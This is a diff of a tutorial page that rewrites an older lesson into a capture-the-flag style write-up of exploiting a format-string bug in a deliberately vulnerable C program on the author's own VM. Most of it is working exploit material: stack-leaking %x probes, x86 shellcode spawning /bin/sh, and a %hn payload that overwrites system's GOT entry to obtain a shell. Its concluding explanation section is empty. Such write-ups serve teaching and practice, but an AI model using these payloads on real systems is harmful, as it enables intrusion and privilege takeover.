@@ -9,37 +9,145 @@
     root='../'>
     <xmp>
 
+# Format string vulnerability:
 
-# Format string bug
+This challenge is running on my own VM. I will give you an access as soon as possible.
 
-- [readelf](http://linux.die.net/man/1/readelf) : Displays information about ELF files
-## 1) Explanation
-
-
-### Example:
-
-Here is the code that I will use as example for this tutorial:
-
+Here is the script:
 ```c
-// Author : TiWim
-// Compilation : gcc stringbug.c -o stringbug -m32 -fno-stack-protector -z execstack
-// For any compilation problem, try to install libc6-dev-i386 first
-
 #include <stdio.h>
+// compile with: gcc -o format -m32 format.c -z execstack -fno-stack-protector
 
-int main (int argc, char ** argv){
+int main(int argc, char** argv){
+	char msg[200];
 
-    if (argc != 2){
-        printf ("Usage: %s <message>\n", argv[0]);
-        return -1;
-    }
-    printf(argv[1]);
-    return 0;
+	fgets(msg, 200, stdin);
+
+	puts("Here is your message:");
+	printf(msg);
+	system("/bin/cat /home/ch03/file.txt");
+
+	return 0;
 }
 ```
-> [Download this script?](../scripts/vulnerable.c)
 
-## 2) Documentation of the tool
+I disabled ASLR:
+```bash
+cat /proc/sys/kernel/randomize_va_space
+0
+```
+
+This script is vulnerable, the goal of this paper is to understand how we can use it.
+
+## Proof of concept:
+```bash
+./format < <(python -c "print 'AAAABBBB' + '.%x' * 100")
+Here is your message:
+AAAABBBB.c8.b7fc7ac0.bffff6e4.bffff6a0.b7fe7ed9.41414141.42424242.2e78252e.[..]
+hello, nice file isn't it?
+```
+
+Here we see obviously that there is a problem with this executable. His right usage should be:
+```bash
+./format < <(python -c "print 'AAAABBBB'")
+Here is your message:
+AAAABBBB.%x.%x.%x[..]
+hello, nice file isn't it?
+```
+
+Printf waits for a format when we call it (look at printf's man page for more information).
+Interesting formats are:
+
+- %x for addresses and to write bytes,
+- %s for reading strings,
+- %n for writing on the stack how many bytes where written on output.
+
+We can print arbitrary offsets with the format '$':
+```bash
+./format < <(python -c "print 'AAAABBBB' + '.%6\$x.%7\$x'")
+Here is your message:
+AAAABBBB.41414141.42424242
+hello, nice file isn't it?
+```
+
+## Information hunting:
+
+Now, we have the offsets of the first chars given in input. Lets pown this binary.
+We will not use gdb for this challenge (this is what is so great with format string bugs)
+
+With readelf, we can see the Global Offset Table:
+
+```bash
+readelf -r ./format
+Relocation section '.rel.dyn' at offset 0x2f8 contains 2 entries:
+ Offset     Info    Type            Sym.Value  Sym. Name
+08049ff0  00000506 R_386_GLOB_DAT    00000000   __gmon_start__
+0804a020  00000805 R_386_COPY        0804a020   stdin
+
+Relocation section '.rel.plt' at offset 0x308 contains 6 entries:
+ Offset     Info    Type            Sym.Value  Sym. Name
+0804a000  00000107 R_386_JUMP_SLOT   00000000   printf
+0804a004  00000207 R_386_JUMP_SLOT   00000000   fgets
+0804a008  00000307 R_386_JUMP_SLOT   00000000   puts
+0804a00c  00000407 R_386_JUMP_SLOT   00000000 =>system <=
+0804a010  00000507 R_386_JUMP_SLOT   00000000   __gmon_start__
+0804a014  00000607 R_386_JUMP_SLOT   00000000   __libc_start_main
+```
+
+At the end, the program calls system to read _file.txt_.
+This system call is not vulnerable but we will use this opportunity to call some shellcode instead of executing the system function.
+
+Lets do this, but before, we will load a shellcode into the environnement:
+```bash
+export LOGNAME=$(python -c "print '\x90' * 100 + '\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80'")
+```
+
+And we use this little code to have its address in memory:
+```c
+#include <stdio.h>
+
+int main(){
+    printf("Logname at: %p\n", getenv("LOGNAME"));
+
+        return 0;
+}
+```
+
+```bash
+./leakadress
+Logname at: 0xbffffef6
+```
+
+Now we are ready!
+
+## Exploitation
+
+With this little [tool](https://github.com/TiWim/format-string), it will by very simple to compute offsets, numbers and addresses:
+
+```bash
+-------------------------------------input:-------------------------------------
+Padding [0]: 0
+Offset [1]: 6
+What [0xdeadbeef]: 0xbffffef6
+Where [0xdeadc0de]: 0804a00c
+-------------------------------------result-------------------------------------
+Payload len: 32
+Address: \x0c\xa0\x04\x08\x0e\xa0\x04\x08
+Payload: python -c "print '\x0c\xa0\x04\x08\x0e\xa0\x04\x08%49143x%7\$hn%16119x%6\$hn'"
+------------------------------------Have Fun!-----------------------------------
+```
+
+We just have to execute the program with the given payload:
+
+
+```bash
+(python -c "print '\x0c\xa0\x04\x08\x0e\xa0\x04\x08%49143x%7\$hn%16119x%6\$hn'"; cat) | ./format
+id
+uid=1005(p0wn3dch03) gid=1008(ch03) groups=1005(p0wn3dch03),1008(ch03)
+```
+
+## Explanation:
+
 
 
 
